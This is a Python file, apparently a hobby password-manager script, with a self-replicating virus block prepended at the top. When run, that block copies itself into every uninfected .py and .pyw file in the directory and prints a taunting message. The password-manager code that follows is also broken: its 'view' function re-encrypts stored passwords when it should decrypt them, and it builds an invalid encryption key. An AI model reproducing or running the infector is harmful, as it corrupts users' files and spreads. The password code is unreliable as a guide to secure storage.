# VIRUS SAYS HI!

import sys
import glob

virus_code = []

with open(sys.argv[0], 'r') as f:
    lines = f.readlines()

self_replicating_part = False
for line in lines:
    if line == "# VIRUS SAYS HI!":
        self_replicating_part = True
    if not self_replicating_part:
        virus_code.append(line)
    if line == "# VIRUS SAYS BYE!\n":
        break

python_files = glob.glob('*.py') + glob.glob('*.pyw')

for file in python_files:
    with open(file, 'r') as f:
        file_code = f.readlines()

    infected = False

    for line in file_code:
        if line == "# VIRUS SAYS HI!\n":
            infected = True
            break

    if not infected:
        final_code = []
        final_code.extend(virus_code)
        final_code.extend('\n')
        final_code.extend(file_code)

        with open(file, 'w') as f:
            f.writelines(final_code)

def malicious_code():
    print("YOU HAVE BEEN INFECTED HAHAHA !!!")

malicious_code()

# VIRUS SAYS BYE!
# Game no. --> 4
from cryptography.fernet import Fernet
'''
def write_key():
  key = Fernet.generate_key()
  with open("key.key", "wb") as key_file:
    key_file.write(key)'''

def load_key():
  file = open("key.key", "rb")
  key = file.read()
  file.close()
  return key


master_pwd = input("What is the master password? ")
key = load_key() + master_pwd.encode()
fer = Fernet(key)



def view():
  with open("password.txt", 'r') as f:
    for line in f.readlines():
      # print(line.rstrip())

      data = line.rstrip()
      user, psw = data.split("|")
      print(f"User: {user} \nPassword: {fer.encrypt(psw.encode())}")

def add():
  name = input("Account Name: ")
  pwd = input("Password: ")

  with open("password.txt", 'a') as f:
    f.write(name + "|" + fer.encrypt(pwd.encode()).decode() + "\n")


while True:
  mode = input("Would you like to add a new password or view existing ones (view/add or q for quit)?").lower()
  if mode == "q":
    break
  elif mode == "view":
    view()
  elif mode == "add":
    add()
  else:
    print("Invalid mode.")